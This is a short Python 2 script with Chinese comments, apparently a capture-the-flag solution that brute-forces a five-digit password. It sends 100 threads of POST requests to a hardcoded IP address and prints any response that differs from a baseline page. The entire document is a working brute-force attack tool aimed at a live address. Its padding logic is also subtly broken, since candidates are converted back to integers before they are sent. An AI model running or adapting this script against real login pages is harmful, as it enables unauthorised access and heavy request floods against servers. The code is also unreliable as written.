# http://123.206.31.85/challenges#%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%E6%9F%A5%E7%9C%8Bflag


# coding: utf-8

import requests
url='http://120.24.86.145:8002/baopo/?yes'
value=[]

#payload number 构造密码
for i in range(0,99999):
    if(len(str(i))<5):
        value.append("0"*(5-len(str(i)))+str(i))
    else :
        
        value.append(str(i))
# standard page 用于比较的页面
data = {'pwd':11111}
content = requests.post(url,data=data)
content.encoding='utf-8'
patch=content.text



from Queue import Queue
from threading import Thread
from time import sleep, ctime 

# 攻击函数
def do_stuff(q):
    while True:
        num = int(q.get())
        data = {'pwd':num}
        #print 'trying %s %s \n' %(num,ctime())
        content = requests.post(url,data=data)
        content.encoding='utf-8'
        html=content.text
        if html != patch:
            print html
        q.task_done()

q = Queue(maxsize=0)

#线程数
num_threads = 100

#载入线程
for i in range(num_threads):
    worker = Thread(target=do_stuff, args=(q,))
    worker.setDaemon(True)
    worker.start()

    
for x in value:
    q.put(x)
q.join()








